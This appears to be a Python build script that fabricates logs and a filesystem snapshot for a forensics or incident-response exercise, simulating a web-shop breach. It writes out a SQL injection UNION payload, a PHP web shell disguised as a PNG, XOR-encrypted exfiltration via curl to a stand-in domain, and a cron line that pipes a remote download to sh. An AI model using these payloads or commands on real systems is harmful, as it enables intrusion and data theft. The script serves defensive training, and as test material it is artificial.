"""Builds /app/evidence at image build time. Deleted from the image afterwards."""
import base64, datetime as dt, io, os, random, sys, tarfile

OUT = sys.argv[1]
rng = random.Random(20261014)
LB = "10.0.0.5"
ATTACKER = "198.51.100.23"
SCANNER = "203.0.113.77"
SHELL_URL = "/uploads/.cache/thumb.php"
SHELL_FS = "/var/www/app/uploads/.cache/thumb.php"
XOR_KEY = b"Zebra!42"
DOMAIN = "upd-cdn-sync.net"
CRON = "/etc/cron.d/apt-compat-check"
STOLEN = {
    "srv/exports/customers_2026Q3.csv": b"id,name,email,card_last4\n" + b"".join(
        f"{i},Customer {i},c{i}@mail.example,{rng.randint(1000, 9999)}\n".encode() for i in range(1, 400)),
    "srv/exports/payroll_sept.xlsx": bytes(rng.getrandbits(8) for _ in range(6000)),
    "etc/app/billing_api.key": b"bill_test_9f2c7a1e5d3b40c8a6e1f7d2c9b05a34\n",
    "home/ubuntu/.ssh/known_hosts": b"git.internal.example ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleOnlyNotARealHostKey000000000000\n",
}
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
       "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"]
PAGES = ["/", "/products", "/products/42", "/products/17", "/cart", "/static/app.js", "/static/site.css",
         "/api/search?q=shoes", "/api/search?q=red+jacket", "/api/cart/add", "/checkout", "/account", "/favicon.ico"]
USERS = ["alice", "bob.k", "chen_w", "dmitri", "erin", "farah.n", "gus"]

access, app, db = [], [], []
t0 = dt.datetime(2026, 10, 13, 0, 0, 0)


def ts(t):
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


def its(t):
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def hit(t, client, method, path, status, size, ua, via_lb=True):
    addr = LB if via_lb else client
    xff = client if via_lb else "-"
    access.append((t, f'{addr} - - [{ts(t)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}" "{xff}"'))


# Benign traffic over two days, plus normal logins.
for _ in range(24000):
    t = t0 + dt.timedelta(seconds=rng.randint(0, 2 * 86400 - 1))
    ip = f"{rng.choice([81, 92, 109, 151, 176, 188])}.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
    p = rng.choice(PAGES)
    if rng.random() < 0.03:
        u = rng.choice(USERS)
        hit(t, ip, "POST", "/login", 302, 0, rng.choice(UAS))
        app.append((t, f"{its(t)} INFO auth login success user={u} remote={LB} xff={ip}"))
    else:
        hit(t, ip, "GET", p, 200 if rng.random() > 0.02 else 404, rng.randint(300, 40000), rng.choice(UAS))
        if p.startswith("/api/search") and rng.random() < 0.05:
            q = p.split("=", 1)[1].replace("+", " ")
            db.append((t, f"{its(t)} SLOW 1.4{rng.randint(0, 9)}s SELECT id,name,price FROM products WHERE name LIKE '%{q}%' AND visible=1"))

# The nightly backup job: a legitimate archive that should not be confused with the theft.
for d in (13, 14):
    t = dt.datetime(2026, 10, d, 2, 30, 0)
    app.append((t, f"{its(t)} INFO cron backup ok archive=/var/backups/app-{d}.tgz files=212"))

# Noisy scanner that never gets in (hits the server directly, not via the load balancer).
st = dt.datetime(2026, 10, 13, 19, 2, 11)
probes = ["/wp-login.php", "/.env", "/phpmyadmin/", "/api/search?q=1'%20OR%20'1'='1", "/admin/", "/.git/config",
          "/api/search?q=1%20UNION%20SELECT%20NULL--", "/server-status", "/login", "/uploads/shell.php?c=aWQ="]
sqlmap = "sqlmap/1.8.9#stable (https://sqlmap.org)"
for i, p in enumerate(probes * 40):
    t = st + dt.timedelta(seconds=i * 3)
    if p == "/login":
        hit(t, SCANNER, "POST", p, 401, 112, sqlmap, via_lb=False)
        app.append((t, f"{its(t)} WARN auth login failed user=admin remote={SCANNER} xff=-"))
    else:
        hit(t, SCANNER, "GET", p, 400 if "search" in p else 404, 162, sqlmap, via_lb=False)
        if "search" in p:
            db.append((t, f"{its(t)} ERROR rejected by parameter filter: {p.split('=', 1)[1]}"))

# The real intrusion, through the load balancer.
ua = UAS[3]
a = dt.datetime(2026, 10, 14, 1, 47, 5)
hit(a, ATTACKER, "GET", "/api/search?q=zz%25", 200, 512, ua)
t = a + dt.timedelta(seconds=40)
hit(t, ATTACKER, "GET", "/api/search?q=zz%25%27%29%20UNION%20SELECT%20username%2Cpassword_hash%2C1%20FROM%20users--%20-", 200, 2871, ua)
db.append((t, f"{its(t)} SLOW 2.91s SELECT id,name,price FROM products WHERE name LIKE '%zz%') UNION SELECT username,password_hash,1 FROM users-- -%' AND visible=1"))
t = a + dt.timedelta(minutes=26, seconds=12)
hit(t, ATTACKER, "POST", "/login", 302, 0, ua)
app.append((t, f"{its(t)} INFO auth login success user=svc_backup remote={LB} xff={ATTACKER}"))
t += dt.timedelta(minutes=3, seconds=8)
hit(t, ATTACKER, "POST", "/admin/media/upload", 201, 64, ua)
app.append((t, f"{its(t)} INFO media upload saved name=thumb.php.png stored={SHELL_FS} user=svc_backup"))
app.append((t, f"{its(t)} WARN media mime sniff mismatch declared=image/png detected=text/x-php path={SHELL_FS}"))
t2 = dt.datetime(2026, 10, 13, 15, 12, 40)
app.append((t2, f"{its(t2)} INFO media upload saved name=banner.png stored=/var/www/app/uploads/2026/10/banner.png user=erin"))
cmds = ["id", "cat /var/www/app/.env",
        "find /srv/exports /etc/app /home/ubuntu -maxdepth 2 -type f -newer /etc/hostname > /tmp/.l",
        "tar czf /tmp/.s.tgz -T /tmp/.l && rm -f /tmp/.l",
        f"python3 /tmp/.x.py /tmp/.s.tgz {XOR_KEY.decode()} > /tmp/.s.bin && rm -f /tmp/.s.tgz",
        f"curl -s -T /tmp/.s.bin https://{DOMAIN}/u/7f3a",
        f"echo '*/15 * * * * www-data curl -s https://{DOMAIN}/b | sh' > {CRON}"]
t += dt.timedelta(minutes=1, seconds=51)
for c in cmds:
    hit(t, ATTACKER, "GET", f"{SHELL_URL}?c={base64.b64encode(c.encode()).decode()}", 200, rng.randint(40, 900), ua)
    t += dt.timedelta(seconds=rng.randint(20, 140))


def write(rel, data):
    p = os.path.join(OUT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "wb") as f:
        f.write(data.encode() if isinstance(data, str) else data)


def lines(rows):
    return "\n".join(l for _, l in sorted(rows, key=lambda x: x[0])) + "\n"


write("logs/access.log", lines(access))
write("logs/app.log", lines(app))
write("logs/db_query.log", lines(db))
write("logs/README", "nginx log_format: $remote_addr - $remote_user [$time_local] \"$request\" $status $body_bytes_sent "
      "\"$http_referer\" \"$http_user_agent\" \"$http_x_forwarded_for\"\n"
      f"Traffic from the internal load balancer arrives with remote_addr={LB}; the client is in the last field.\n"
      "All timestamps are UTC.\n")

# Filesystem snapshot.
write("fs" + SHELL_FS, b"\x89PNG\r\n\x1a\n<?php @system(base64_decode($_GET['c'])); ?>\n")
write("fs/var/www/app/uploads/2026/10/banner.png", b"\x89PNG\r\n\x1a\n" + bytes(rng.getrandbits(8) for _ in range(900)))
write("fs/tmp/.x.py", "import sys\nk=sys.argv[2].encode()\nd=open(sys.argv[1],'rb').read()\n"
      "sys.stdout.buffer.write(bytes(b^k[i%len(k)] for i,b in enumerate(d)))\n")
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tf:
    for name, data in sorted(STOLEN.items()):
        ti = tarfile.TarInfo(name)
        ti.size, ti.mtime = len(data), 1792000000
        tf.addfile(ti, io.BytesIO(data))
raw = buf.getvalue()
write("fs/tmp/.s.bin", bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(raw)))
write("fs/var/backups/app-14.tgz", bytes(rng.getrandbits(8) for _ in range(3000)))
write("fs" + CRON, f"*/15 * * * * www-data curl -s https://{DOMAIN}/b | sh\n")
write("fs/etc/cron.d/e2scrub_all", "30 3 * * 0 root test -e /run/systemd/system || /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n")
write("fs/etc/cron.d/php", "09,39 * * * * root [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean\n")
write("fs/etc/cron.d/app-backup", "30 2 * * * deploy /usr/local/bin/app-backup.sh\n")
write("fs/var/www/app/.env", "DB_HOST=127.0.0.1\nDB_USER=shop\nDB_PASS=redacted-by-ir-team\n")
